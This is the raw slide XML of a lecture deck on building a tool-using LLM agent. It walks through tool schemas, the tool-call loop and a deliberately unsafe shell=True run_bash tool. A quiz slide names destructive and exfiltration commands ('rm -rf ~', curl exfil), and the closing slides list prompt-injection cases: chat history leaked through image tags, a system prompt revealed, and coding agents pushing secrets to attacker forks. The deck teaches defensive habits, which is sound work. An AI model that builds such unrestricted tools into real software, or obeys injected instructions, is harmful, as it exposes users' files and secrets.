            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>contents and decide what to do next.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sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Google Shape;303;p1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Step 1: defining a tool</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p15"/>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05" name="Google Shape;305;p15"/>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15"/>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tools =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"name": "read_file",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"description": "Read and return the contents of a text file.",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"input_schema":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"type": "object",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"properties":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"path":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"type": "string",</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"description": "Path relative to project root.",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"required": ["path"],</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That's the contract. The model now knows the tool exists, what it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does, and exactly what shape of arguments it should produce.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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Google Shape;312;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Step 2: the model asks to call it</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313" name="Google Shape;313;p16"/>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14" name="Google Shape;314;p16"/>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16"/>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 You send messages + tools to the API:</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response = client.messages.create(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model="claude-opus-4-8",</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max_tokens=1024,</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tools=tools,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messages=[{"role": "user", "content": "what's in app.py?"}],</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The response.content is now a list of BLOCKS, not just text.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One of them is a tool_use block:</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for block in response.content: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print(block.type, block)</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tool_use ToolUseBlock(</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id="toolu_01ABcd...",</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name="read_file",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input={"path": "app.py"},</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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Google Shape;321;p1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Steps 3 + 4: you execute, you feed back</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Google Shape;322;p17"/>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23" name="Google Shape;323;p1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4" name="Google Shape;324;p17"/>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for block in response.content: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if block.type == "tool_use":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Step 3: YOU run the actual function.</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result = read_file(**block.input)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Step 4: append the request and the result to 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 then call the model again so it can see the answer.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messages.append({"role": "assistant", "content": response.content})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messages.append({"role": "user", "content":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"type": "tool_result",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"tool_use_id": block.id,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"content": result,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response = client.messages.create(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model="claude-opus-4-8",</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max_tokens=1024, tools=tools, messages=messages,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This time the model sees the file contents and answers the user.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1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What’s sketchy about this?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331" name="Google Shape;331;p18"/>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32" name="Google Shape;332;p18"/>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3" name="Google Shape;333;p18"/>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333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>import subprocess</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run_bash(cmd: str) -&gt; str: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"""Run a shell command and return its output."""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result = subprocess.run(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cmd,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shell=True,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capture_output=True,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text=True,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result.stdout + result.stderr</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Wired into the agent loop, called automatically whenever the model</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asks. What is wrong with this tool?</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  nothing - the model is smart enough to only ask for safe commands</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(b)  shell=True lets the model run any command (`rm -rf ~`, curl</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exfil, anything the shell can do)</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  capture_output=True hides errors from the user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(d)  it should be async</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g3ec891ba402_0_4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Tools are authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="340" name="Google Shape;340;g3ec891ba402_0_44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="461700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Providing a tool to an agent == providing the tool to the users of the agent</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5"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="346" name="Google Shape;346;g3ec891ba402_0_5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Tools are authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="347" name="Google Shape;347;g3ec891ba402_0_50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="1800900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Providing a tool to an agent == providing the tool to the users of the agent</a:t>
            </a:r>
            <a:endParaRPr sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="333344"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="2400" b="1">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400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Treat every tool the way you'd treat an API endpoint exposed on the internet</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:srgbClr val="333344"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="333344"/>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2"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;g3ec891ba402_0_5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Tools are authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="354" name="Google Shape;354;g3ec891ba402_0_56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="16161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few habits worth keeping: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Narrow tools beat broad ones.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>read_file_in_project_di</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:endParaRPr>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a lot safer than a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> - the narrower the contract,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less damage a confused or compromised agent can do.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9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="360" name="Google Shape;360;g3ec891ba402_0_6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Tools are authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="Google Shape;361;g3ec891ba402_0_62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="23859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few habits worth keeping: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Narrow tools beat broad ones.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>read_file_in_project_di</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:endParaRPr>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a lot safer than a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> - the narrower the contract,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less damage a confused or compromised agent can do.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Sandbox the dangerous ones.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Run them inside a container,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chroot, a throwaway VM, anywhere the blast radius stays put.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6"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="367" name="Google Shape;367;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Tools are authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="368" name="Google Shape;368;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="103629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few habits worth keeping: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Narrow tools beat broad ones.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>read_file_in_project_di</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:endParaRPr>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a lot safer than a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> - the narrower the contract,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less damage a confused or compromised agent can do.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Sandbox the dangerous ones.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Run them inside a container,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chroot, a throwaway VM, anywhere the blast radius stays put.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Confirm before anything destructive.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> For anything that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deletes, writes outside the working tree, or calls out to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world, pop a y/n first - that's exactly why Claude Code asks.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73"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="374" name="Google Shape;374;p20"/>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Build it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9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="Google Shape;380;p2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working agent (1/2): setup</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="381" name="Google Shape;381;p21"/>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82" name="Google Shape;382;p21"/>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3" name="Google Shape;383;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="43047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client = Anthropic()</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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def read_file(path):</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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return open(path).read()</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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Clr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># Yes, this is the scary shell=True tool</a:t>
            </a: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def run_bash(cmd):</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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r = subprocess.run(cmd, shell=True, capture_output=True, text=True)</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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return r.stdout + r.stderr</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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TOOLS_BY_NAME = {"read_file": read_file, "run_bash": run_bash}</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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TOOLS = [...]   # the schemas from earlier, one entry per function</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>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messages = [{"role": "user", "content": input("&gt; ")}]</a:t>
            </a:r>
            <a:endParaRPr sz="15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8"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389" name="Google Shape;389;p2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working agent (2/2): the loop</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="Google Shape;390;p22"/>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91" name="Google Shape;391;p22"/>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22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="458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333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>while True: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 = client.messages.create(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model="claude-opus-4-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="13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max_tokens=4096,</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tools=TOOLS,</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messages=messages,</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messages.append({"role": "assistant", "content": r.content})</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r.stop_reason != "tool_use":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print(next(b.text for b in r.content if b.type == "text"))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break</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results =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{"type": "tool_result",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"tool_use_id": b.id,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"content": TOOLS_BY_NAME[b.name](**b.input)}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for b in r.content if b.type == "tool_use"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messages.append({"role": "user", "content": results})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sp>
        <p:nvSpPr>
          <p:cNvPr id="398" name="Google Shape;398;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Try it: find the longest function in this repo</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="399" name="Google Shape;399;p23"/>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Boot the agent and at the prompt type:</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&gt; find the longest function in this codebase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Then watch what it actually does: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Calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>run_bash("find . -name '*.py'")</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> to list the files.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Calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>read_file(...)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> on each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Counts lines per function (or runs a grep, or writes a little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script to do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Comes back with "the longest one is `foo` in bar.py, 84 lines."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That's maybe three to ten tool calls with no human typing anything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between, which is an agent doing real work...and there's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nothing in there you haven't already seen.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4"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="Google Shape;405;g3ec891ba402_1_52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modern frontier: prompt injection</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="406" name="Google Shape;406;g3ec891ba402_1_521"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="26781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Documented cases in just the last two years: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ChatGPT plugins exfiltrating chat history via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>&lt;img&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> tags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markdown the model was asked to summarize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Bing Chat tricked into revealing its full system prompt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Coding agents persuaded by README files to push their own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repo's secrets to attacker-controlled forks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="60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1"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="Google Shape;412;g3ec891ba402_1_44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modern frontier: prompt injection</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="413" name="Google Shape;413;g3ec891ba402_1_440"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="42789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Documented cases in just the last two years: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ChatGPT plugins exfiltrating chat history via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
